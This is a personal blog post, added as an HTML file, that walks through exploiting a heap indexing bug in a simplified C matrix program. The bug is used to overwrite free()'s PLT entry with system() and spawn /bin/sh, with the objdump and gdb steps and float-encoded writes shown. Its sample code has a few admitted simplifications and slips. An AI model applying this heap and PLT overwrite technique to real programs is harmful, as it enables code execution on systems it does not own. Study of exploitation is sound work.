@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<title>A Tale of Indices - ralismark</title>
+
+<!--[if lt IE 9]>
+	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv='X-UA-Compatible' content='IE=edge'>
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="canonical" href="/posts/a-tale-of-indices">
+<meta name="description" content="Exploting bad indexing code to mess with malloc and the PLT">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/logo-32.png">
+
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="ralismark" />
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="/assets/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+<!-- experiment: indieweb -->
+<link rel="webmention" href="https://webmention.io/www.ralismark.xyz/webmention" />
+<link rel="pingback" href="https://webmention.io/www.ralismark.xyz/xmlrpc" />
+
+	</head>
+	<body>
+		<header id="site-nav" class="full-width text-inverted">
+	<nav class="content-width flex-distribute">
+		<a id="navbar-root" href="/">ralismark</a>
+
+		
+
+		<ul id="navbar-pages" class="list-inline my-0">
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			<li class="navbar-page">
+				<a class="navbar-link" href="/posts">
+					Blog
+				</a>
+			</li>
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+		</ul>
+	</nav>
+</header>
+
+
+		<main class="content-width my-2 h-entry">
+			<nav class="post-nav flex-distribute my-1">
+	
+		<a class="prev" href="/posts/initial-post">&laquo; e4ecd8b Initial Post</a>
+	
+
+	
+		<a class="next" href="/posts/cpp14-concept-1">Even More Concepts in C++14 (part 1) &raquo;</a>
+	
+</nav>
+
+
+<header class="post-meta fenced-b mb-1 text-centre bleed">
+	<h1 id="post-title" class="p-name">A Tale of Indices</h1>
+	<p class="p-summary"><em>
+		Exploting bad indexing code to mess with malloc and the PLT
+	</em></p>
+	<ul class="li-flat">
+		<li>
+		<time datetime="2017-04-13T00:00:00-05:00" class="dt-published">
+			<a class="u-url" href="/posts/a-tale-of-indices">
+			13 April 2017
+			</a>
+		</time>
+		</li>
+
+		<li>
+			
+			<abbr title="962 total words">5 mins to read</abbr>
+		</li>
+
+		
+		
+		<li id="post-tags">
+			<span id="post-tag-label">Tags:</span>
+			
+				<a class="p-category badge" href="/tags#exploit">exploit</a>
+			
+				<a class="p-category badge" href="/tags#c-cpp">c-cpp</a>
+			
+		</li>
+		
+	</p>
+</header>
+
+<article class="post-content e-content bounded">
+	<p>This is the story of how bad indexing code can lead to an exploit. Even though
+this is on the heap, most of it doesn’t actually involve malloc that much, but
+relies on a specific feature of it: memory blocks are adjacent. However, it does
+involve messing with the plt!</p>
+
+<!--more-->
+
+<h2 id="a-wild-bug-appears"><a href="#a-wild-bug-appears">A Wild Bug Appears</a></h2>
+
+<p>First, the code. This is not exactly the original code, but simplified quite a
+bit (removing the input logic, much checking and other functionality).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">matrix</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">rows</span><span class="p">,</span> <span class="n">cols</span><span class="p">;</span>
+	<span class="kt">float</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span> <span class="c1">// allocated in the heap, has rows * cols floats</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">matrix</span><span class="o">*</span> <span class="n">matrices</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// each matrix is allocated in the heap</span>
+
+<span class="kt">float</span><span class="o">*</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// assume these values have been checked and are in range</span>
+	<span class="k">return</span> <span class="o">&amp;</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="n">row</span> <span class="o">*</span> <span class="n">mat</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">+</span> <span class="n">col</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">float</span> <span class="nf">get</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="o">*</span><span class="n">get_addr</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">col</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">set</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">int</span> <span class="n">row</span><span class="p">,</span> <span class="kt">int</span> <span class="n">col</span><span class="p">,</span> <span class="kt">int</span> <span class="n">val</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="o">*</span><span class="n">get_addr</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">row</span><span class="p">,</span> <span class="n">call</span><span class="p">)</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">allocate</span><span class="p">(</span><span class="kt">int</span> <span class="n">rows</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cols</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">get_free_id</span><span class="p">();</span> <span class="c1">// logic somewhere else</span>
+	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">matrix</span><span class="p">));</span>
+	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">=</span> <span class="n">rows</span><span class="p">;</span>
+	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">cols</span> <span class="o">=</span> <span class="n">cols</span><span class="p">;</span>
+	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">rows</span> <span class="o">*</span> <span class="n">cols</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">release</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]);</span>
+	<span class="n">matrices</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Can you find the bug? Hint: it’s in <code class="language-plaintext highlighter-rouge">get_addr</code>. The matrix indexing is
+incorrect, it should be <code class="language-plaintext highlighter-rouge">row * mat-&gt;cols + col</code>. See the difference? This
+overflow is what allows the shell to be spawned.</p>
+
+<h2 id="a-note-on-float-conversion"><a href="#a-note-on-float-conversion">A note on float conversion</a></h2>
+
+<p>In this program, memory is only accessible as floats. While inconvenient, this
+is still usable as floats also take up the same space as ints, 4 bytes. With
+enough digits, we can be guaranteed to get an identical value when we set it. To
+find this value, we can use a union:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="k">union</span> <span class="p">{</span>
+		<span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
+		<span class="kt">float</span> <span class="n">b</span><span class="p">;</span>
+	<span class="p">};</span>
+	<span class="c1">// set a or b here</span>
+	<span class="c1">// e.g. a = 0x100</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%8x %.9g"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Later on, we’ll also write strings. Since the system is little endian (x86), we
+just use the characters’ ASCII value, in reverse order (for each 4-byte chunk).</p>
+
+<h2 id="exploit-preparation"><a href="#exploit-preparation">Exploit Preparation</a></h2>
+
+<p>Firstly, a bit on <code class="language-plaintext highlighter-rouge">malloc()</code>. It obtains memory from the system (usually via
+<code class="language-plaintext highlighter-rouge">mmap()</code>), and divides it up into chunks. These are then allocated when
+requested by the programmer. Since the block given is the first that fit the
+size, this results in the matrices and their descriptors being allocated right
+next to each other:</p>
+
+<pre><code class="language-raw">+-------------+-------------------+-------------+-------------------+
+| (sz) | mat1 | (sz) | mat1-&gt;data | (sz) | mat2 | (sz) | mat2-&gt;data |
++-------------+-------------------+-------------+-------------------+
+</code></pre>
+<p>As a result, we can exploit the bad indexing to overwrite the matrix descriptor
+(in this case mat2) from the previous data block (mat1-&gt;data). Through this, we
+can overwrite the data pointer of mat2 to whatever we want, allowing us to write
+to any location in memory. One potential target is the plt (procedural link
+table), which lists the location of functions of dynamically loaded libraries
+(e.g. libc). However, one specific entry is of interest - <code class="language-plaintext highlighter-rouge">free()</code>. When
+matrices are released, this is called on user-editable data, and with that as
+the only argument. <code class="language-plaintext highlighter-rouge">system()</code> also takes a pointer as a single argument!</p>
+
+<p>However, there is a problem: dynamic libraries can be loaded anywhere, and so
+can <code class="language-plaintext highlighter-rouge">system()</code>. However, it is always at the same offset from <code class="language-plaintext highlighter-rouge">free()</code>, and we
+can use that, along with the existing plt entry to calculate the position of
+<code class="language-plaintext highlighter-rouge">system()</code>.</p>
+
+<h2 id="actual-exploit"><a href="#actual-exploit">Actual Exploit</a></h2>
+
+<p>First, we need to get some information:</p>
+
+<pre><code class="language-raw">$ objdump -R matrix | grep free
+0804a10c R_386_JUMP_SLOT   free
+$ gdb -q matrix
+Reading symbols from matrix...(no debugging symbols found)...done.
+(gdb) p __libc_system - __libc_free
+$1 = -228656
+</code></pre>
+
+<p>Now, we perform the actual exploit. First, we create 2 matrices which have more
+rows than columns (e.g. 8*7). We then create and release another matrix. This is
+required to initialize the plt entry to the actual location of <code class="language-plaintext highlighter-rouge">free()</code>
+(<code class="language-plaintext highlighter-rouge">__libc_free()</code>), from which we can figure out the location of <code class="language-plaintext highlighter-rouge">system()</code> using
+the offset. We now can use the overflowing get_addr logic to overwrite mat2’s
+data pointer to point to 0x0804a10c (the address of the plt entry).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="n">allocate</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1">// id 0</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1">// id 1</span>
+<span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// id 2</span>
+<span class="n">release</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now, how do we figure out where to write to overwrite that pointer? Since it’s
+the last element of the struct, we search down from the top, until we get to the
+second non-zero value. Why second? Because the first would be the size of the
+next block, and we have no need overwriting that. From my tests, it appears that
+with an 8*7 matrix, the value is located at [7,4], which we overwrite with the
+float equivalent of 0x0804a10c.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mf">3.991161479e-34</span><span class="p">);</span> <span class="c1">// mat[7][4] = 0x0804a10c</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Then, we can get the current value of the plt entry, which would be the address
+of <code class="language-plaintext highlighter-rouge">__libc_free()</code>. We can add the offset (-228656) to this to get the address
+of <code class="language-plaintext highlighter-rouge">__libc_system()</code> and overwrite the exiting value with this.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">get</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// returns -4.468552546e+33 == 0xf75c5110</span>
+<span class="n">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mf">4.397786941e+33</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0xf758d3e0 == (0xf75c5110 - 228656)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now that we have overwritten <code class="language-plaintext highlighter-rouge">free()</code>, we can write the payload, which is
+“/bin/sh” (you can use any command here though). And we execute the command by
+freeing that matrix.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">1.805717599e+28</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0x6e69622f == '/bin'</span>
+<span class="n">set</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mf">9.592211688e-39</span><span class="p">);</span> <span class="c1">// mat[0][0] = 0x0068732f == '/sh\0'</span>
+<span class="n">release</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Shell!</p>
+
+</article>
+
+<nav class="post-nav flex-distribute my-1">
+	
+		<a class="prev" href="/posts/initial-post">&laquo; e4ecd8b Initial Post</a>
+	
+
+	
+		<a class="next" href="/posts/cpp14-concept-1">Even More Concepts in C++14 (part 1) &raquo;</a>
+	
+</nav>
+
+
+		</main>
+
+		<div id="site-footer" class="content-width text-centre">
+		<ul class="li-flat mt-0">
+			<li><a href="/everything">everything</a></li>
+			<li><a href="/booklist">reading list</a></li>
+		</ul>
+		All work licensed under <b>CC BY-SA 4.0</b> unless otherwise stated.
+		<br>
+		This site is <a href="https://github.com/ralismark/ralismark.github.io">open source</a>!
+</div>
+
+	</body>
+</html>
